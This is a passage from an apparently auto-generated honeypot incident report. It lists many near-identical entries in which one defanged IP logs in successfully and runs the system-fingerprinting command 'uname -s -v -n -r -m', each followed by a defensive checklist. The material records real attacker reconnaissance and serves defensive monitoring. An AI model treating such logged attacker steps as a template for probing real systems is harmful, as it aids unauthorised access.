**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da41c13ad06d

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:16` | `cowrie.session.connect` |
| `2026-07-30 03:21:16` | `cowrie.client.version` |
| `2026-07-30 03:21:16` | `cowrie.client.kex` |
| `2026-07-30 03:21:17` | `cowrie.login.success` |
| `2026-07-30 03:21:18` | `cowrie.session.params` |
| `2026-07-30 03:21:18` | `cowrie.command.input` |
| `2026-07-30 03:21:19` | `cowrie.log.closed` |
| `2026-07-30 03:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89b85a78511

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:16` | `cowrie.session.connect` |
| `2026-07-30 03:21:16` | `cowrie.client.version` |
| `2026-07-30 03:21:16` | `cowrie.client.kex` |
| `2026-07-30 03:21:51` | `cowrie.login.success` |
| `2026-07-30 03:21:53` | `cowrie.session.params` |
| `2026-07-30 03:21:53` | `cowrie.command.input` |
| `2026-07-30 03:21:53` | `cowrie.log.closed` |
| `2026-07-30 03:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae1d6f89a2fe

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:19` | `cowrie.session.connect` |
| `2026-07-30 03:21:19` | `cowrie.client.version` |
| `2026-07-30 03:21:19` | `cowrie.client.kex` |
| `2026-07-30 03:21:20` | `cowrie.login.success` |
| `2026-07-30 03:21:21` | `cowrie.session.params` |
| `2026-07-30 03:21:21` | `cowrie.command.input` |
| `2026-07-30 03:21:21` | `cowrie.log.closed` |
| `2026-07-30 03:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d87fa4d555

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:21` | `cowrie.session.connect` |
| `2026-07-30 03:21:21` | `cowrie.client.version` |
| `2026-07-30 03:21:22` | `cowrie.client.kex` |
| `2026-07-30 03:21:23` | `cowrie.login.success` |
| `2026-07-30 03:21:24` | `cowrie.session.params` |
| `2026-07-30 03:21:24` | `cowrie.command.input` |
| `2026-07-30 03:21:24` | `cowrie.log.closed` |
| `2026-07-30 03:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc886d86f153

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:22` | `cowrie.session.connect` |
| `2026-07-30 03:21:22` | `cowrie.client.version` |
| `2026-07-30 03:21:23` | `cowrie.client.kex` |
| `2026-07-30 03:21:25` | `cowrie.login.success` |
| `2026-07-30 03:21:28` | `cowrie.session.params` |
| `2026-07-30 03:21:28` | `cowrie.command.input` |
| `2026-07-30 03:21:28` | `cowrie.log.closed` |
| `2026-07-30 03:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87689023a810

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:24` | `cowrie.session.connect` |
| `2026-07-30 03:21:24` | `cowrie.client.version` |
| `2026-07-30 03:21:24` | `cowrie.client.kex` |
| `2026-07-30 03:21:26` | `cowrie.login.success` |
| `2026-07-30 03:21:27` | `cowrie.session.params` |
| `2026-07-30 03:21:27` | `cowrie.command.input` |
| `2026-07-30 03:21:28` | `cowrie.log.closed` |
| `2026-07-30 03:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ec8267151c

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:25` | `cowrie.session.connect` |
| `2026-07-30 03:21:25` | `cowrie.client.version` |
| `2026-07-30 03:22:17` | `cowrie.client.kex` |
| `2026-07-30 03:22:19` | `cowrie.login.success` |
| `2026-07-30 03:22:21` | `cowrie.session.params` |
| `2026-07-30 03:22:21` | `cowrie.command.input` |
| `2026-07-30 03:22:21` | `cowrie.log.closed` |
| `2026-07-30 03:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1ba3a9a7140

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:26` | `cowrie.session.connect` |
| `2026-07-30 03:21:26` | `cowrie.client.version` |
| `2026-07-30 03:22:19` | `cowrie.client.kex` |
| `2026-07-30 03:22:20` | `cowrie.login.success` |
| `2026-07-30 03:22:21` | `cowrie.session.params` |
| `2026-07-30 03:22:21` | `cowrie.command.input` |
| `2026-07-30 03:22:22` | `cowrie.log.closed` |
| `2026-07-30 03:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8be47e9dcc2c

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:28` | `cowrie.session.connect` |
| `2026-07-30 03:21:28` | `cowrie.client.version` |
| `2026-07-30 03:21:28` | `cowrie.client.kex` |
| `2026-07-30 03:21:29` | `cowrie.login.success` |
| `2026-07-30 03:21:30` | `cowrie.session.params` |
| `2026-07-30 03:21:30` | `cowrie.command.input` |
| `2026-07-30 03:21:32` | `cowrie.log.closed` |
| `2026-07-30 03:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1e6c42775b

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:28` | `cowrie.session.connect` |
| `2026-07-30 03:21:28` | `cowrie.client.version` |
| `2026-07-30 03:22:14` | `cowrie.client.kex` |
| `2026-07-30 03:22:15` | `cowrie.login.success` |
| `2026-07-30 03:22:16` | `cowrie.session.params` |
| `2026-07-30 03:22:16` | `cowrie.command.input` |
| `2026-07-30 03:22:17` | `cowrie.log.closed` |
| `2026-07-30 03:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8c554381502

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:28` | `cowrie.session.connect` |
| `2026-07-30 03:21:28` | `cowrie.client.version` |
| `2026-07-30 03:21:30` | `cowrie.client.kex` |
| `2026-07-30 03:21:32` | `cowrie.login.success` |
| `2026-07-30 03:21:33` | `cowrie.session.params` |
| `2026-07-30 03:21:33` | `cowrie.command.input` |
| `2026-07-30 03:21:33` | `cowrie.log.closed` |
| `2026-07-30 03:21:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a9114940a9f

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:29` | `cowrie.session.connect` |
| `2026-07-30 03:21:29` | `cowrie.client.version` |
| `2026-07-30 03:21:32` | `cowrie.client.kex` |
| `2026-07-30 03:21:33` | `cowrie.login.success` |
| `2026-07-30 03:21:34` | `cowrie.session.params` |
| `2026-07-30 03:21:34` | `cowrie.command.input` |
| `2026-07-30 03:21:35` | `cowrie.log.closed` |
| `2026-07-30 03:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76211ace502e

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:30` | `cowrie.session.connect` |
| `2026-07-30 03:21:30` | `cowrie.client.version` |
| `2026-07-30 03:21:30` | `cowrie.client.kex` |
| `2026-07-30 03:21:31` | `cowrie.login.success` |
| `2026-07-30 03:21:32` | `cowrie.session.params` |
| `2026-07-30 03:21:32` | `cowrie.command.input` |
| `2026-07-30 03:21:32` | `cowrie.log.closed` |
| `2026-07-30 03:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d58750a0d28

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:31` | `cowrie.session.connect` |
| `2026-07-30 03:21:31` | `cowrie.client.version` |
| `2026-07-30 03:21:32` | `cowrie.client.kex` |
| `2026-07-30 03:21:33` | `cowrie.login.success` |
| `2026-07-30 03:21:35` | `cowrie.session.params` |
| `2026-07-30 03:21:35` | `cowrie.command.input` |
| `2026-07-30 03:21:35` | `cowrie.log.closed` |
| `2026-07-30 03:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d264b5b2479f

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:32` | `cowrie.session.connect` |
| `2026-07-30 03:21:32` | `cowrie.client.version` |
| `2026-07-30 03:21:32` | `cowrie.client.kex` |
| `2026-07-30 03:21:33` | `cowrie.login.success` |
| `2026-07-30 03:21:36` | `cowrie.session.params` |
| `2026-07-30 03:21:36` | `cowrie.command.input` |
| `2026-07-30 03:21:36` | `cowrie.log.closed` |
| `2026-07-30 03:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b54785973a8

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:33` | `cowrie.session.connect` |
| `2026-07-30 03:21:33` | `cowrie.client.version` |
| `2026-07-30 03:21:33` | `cowrie.client.kex` |
| `2026-07-30 03:21:36` | `cowrie.login.success` |
| `2026-07-30 03:21:37` | `cowrie.session.params` |
| `2026-07-30 03:21:37` | `cowrie.command.input` |
| `2026-07-30 03:21:38` | `cowrie.log.closed` |
| `2026-07-30 03:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-177fdd8f2c64

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:33` | `cowrie.session.connect` |
| `2026-07-30 03:21:33` | `cowrie.client.version` |
| `2026-07-30 03:21:35` | `cowrie.client.kex` |
| `2026-07-30 03:21:42` | `cowrie.login.success` |
| `2026-07-30 03:21:44` | `cowrie.session.params` |
| `2026-07-30 03:21:44` | `cowrie.command.input` |
| `2026-07-30 03:21:44` | `cowrie.log.closed` |
| `2026-07-30 03:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b11614449f

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:37` | `cowrie.session.connect` |
| `2026-07-30 03:21:37` | `cowrie.client.version` |
| `2026-07-30 03:21:38` | `cowrie.client.kex` |
| `2026-07-30 03:21:40` | `cowrie.login.success` |
| `2026-07-30 03:21:41` | `cowrie.session.params` |
| `2026-07-30 03:21:41` | `cowrie.command.input` |
| `2026-07-30 03:21:42` | `cowrie.log.closed` |
| `2026-07-30 03:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8831ae1e3b2

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:39` | `cowrie.session.connect` |
| `2026-07-30 03:21:41` | `cowrie.client.version` |
| `2026-07-30 03:21:41` | `cowrie.client.kex` |
| `2026-07-30 03:21:42` | `cowrie.login.success` |
| `2026-07-30 03:21:43` | `cowrie.session.params` |
| `2026-07-30 03:21:43` | `cowrie.command.input` |
| `2026-07-30 03:21:44` | `cowrie.log.closed` |
| `2026-07-30 03:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-601e7fc02cd0

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:40` | `cowrie.session.connect` |
| `2026-07-30 03:21:40` | `cowrie.client.version` |
| `2026-07-30 03:21:40` | `cowrie.client.kex` |
| `2026-07-30 03:21:41` | `cowrie.login.success` |
| `2026-07-30 03:21:42` | `cowrie.session.params` |
| `2026-07-30 03:21:42` | `cowrie.command.input` |
| `2026-07-30 03:21:44` | `cowrie.log.closed` |
| `2026-07-30 03:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5992859219ca

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:41` | `cowrie.session.connect` |
| `2026-07-30 03:21:41` | `cowrie.client.version` |
| `2026-07-30 03:21:46` | `cowrie.client.kex` |
| `2026-07-30 03:21:47` | `cowrie.login.success` |
| `2026-07-30 03:21:49` | `cowrie.session.params` |
| `2026-07-30 03:21:49` | `cowrie.command.input` |
| `2026-07-30 03:21:49` | `cowrie.log.closed` |
| `2026-07-30 03:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7fe84561ebc

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:44` | `cowrie.session.connect` |
| `2026-07-30 03:21:44` | `cowrie.client.version` |
| `2026-07-30 03:21:44` | `cowrie.client.kex` |
| `2026-07-30 03:21:45` | `cowrie.login.success` |
| `2026-07-30 03:21:46` | `cowrie.session.params` |
| `2026-07-30 03:21:46` | `cowrie.command.input` |
| `2026-07-30 03:21:46` | `cowrie.log.closed` |
| `2026-07-30 03:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637b623f7e24

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:44` | `cowrie.session.connect` |
| `2026-07-30 03:21:44` | `cowrie.client.version` |
| `2026-07-30 03:21:46` | `cowrie.client.kex` |
| `2026-07-30 03:21:46` | `cowrie.login.success` |
| `2026-07-30 03:21:49` | `cowrie.session.params` |
| `2026-07-30 03:21:49` | `cowrie.command.input` |
| `2026-07-30 03:21:50` | `cowrie.log.closed` |
| `2026-07-30 03:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3e8ba815662

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:45` | `cowrie.session.connect` |
| `2026-07-30 03:21:45` | `cowrie.client.version` |
| `2026-07-30 03:21:45` | `cowrie.client.kex` |
| `2026-07-30 03:21:46` | `cowrie.login.success` |
| `2026-07-30 03:21:48` | `cowrie.session.params` |
| `2026-07-30 03:21:48` | `cowrie.command.input` |
| `2026-07-30 03:21:49` | `cowrie.log.closed` |
| `2026-07-30 03:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9f6fe5ad596

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:46` | `cowrie.session.connect` |
| `2026-07-30 03:21:46` | `cowrie.client.version` |
| `2026-07-30 03:21:46` | `cowrie.client.kex` |
| `2026-07-30 03:21:50` | `cowrie.login.success` |
| `2026-07-30 03:21:51` | `cowrie.session.params` |
| `2026-07-30 03:21:51` | `cowrie.command.input` |
| `2026-07-30 03:21:51` | `cowrie.log.closed` |
| `2026-07-30 03:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a07c4fd331

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:49` | `cowrie.session.connect` |
